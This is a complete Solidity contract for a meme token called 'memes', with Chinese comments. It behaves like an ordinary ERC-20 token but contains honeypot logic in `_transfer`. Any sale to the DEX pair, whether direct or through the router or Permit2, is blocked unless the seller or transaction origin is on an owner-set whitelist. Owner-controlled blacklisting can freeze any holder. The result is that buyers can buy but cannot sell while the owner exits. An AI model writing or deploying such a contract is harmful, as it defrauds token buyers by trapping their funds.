// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract memes {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public owner;

    // DEX 相关
    address public pair;      // Uniswap / Pancake Pair
    address public router;    // Universal Router / Router
    address public permit2;   // Permit2

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public blackList;
    mapping(address => bool) public whiteList;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    constructor(
        string memory _name,
        string memory _symbol
    ) {
        name = _name;
        symbol = _symbol;
        owner = msg.sender;

        uint256 supply = 1_000_000 * 1e18;
        totalSupply = supply;
        balanceOf[msg.sender] = supply;

        // 默认白名单
        whiteList[msg.sender] = true;
        whiteList[msg.sender] = true;

        router = (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        permit2 = (0x000000000022D473030F116dDEE9F6B43aC78BA3);
        emit Transfer(address(0), msg.sender, supply);
    }

    // =========================
    // 管理函数
    // =========================

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }

    function setRouter(address _router) external onlyOwner {
        router = _router;
    }

    function setPermit2(address _permit2) external onlyOwner {
        permit2 = _permit2;
    }

    function setWhiteList(address user, bool status) external onlyOwner {
        whiteList[user] = status;
    }

    function batchSetWhiteList(address[] calldata users, bool status)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < users.length; i++) {
            whiteList[users[i]] = status;
        }
    }

    function setBlackList(address user, bool status) external onlyOwner {
        blackList[user] = status;
    }

    // =========================
    // ERC20 基础函数
    // =========================

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE_LOW");

        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }

        _transfer(from, to, amount);
        return true;
    }

    // =========================
    // 核心卖出限制逻辑（重点）
    // =========================

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(!blackList[from], "SENDER_BLACKLISTED");
        require(!blackList[to], "RECEIVER_BLACKLISTED");
        require(balanceOf[from] >= amount, "BALANCE_LOW");

        // ⭐ 只在“卖给 Pair”时触发限制
        if (to == pair) {
            // 通过 Router / Permit2 卖
            if (from == router || from == permit2) {
                require(
                    whiteList[tx.origin],
                    "ORIGIN_NOT_WHITELISTED"
                );
            } 
            // 直接卖（非路由）
            else {
                require(
                    whiteList[from],
                    "SENDER_NOT_WHITELISTED"
                );
            }
        }

        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }

        emit Transfer(from, to, amount);
    }
}

